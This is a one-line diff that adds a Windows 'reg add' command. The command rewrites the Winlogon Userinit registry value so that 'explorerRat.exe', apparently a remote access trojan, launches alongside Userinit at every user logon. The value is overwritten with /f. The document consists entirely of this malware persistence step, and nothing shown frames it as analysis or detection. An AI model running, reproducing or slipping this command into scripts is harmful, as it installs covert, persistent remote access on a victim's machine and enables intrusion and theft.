@@ -1,0 +1,1 @@
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, explorerRat.exe" /f
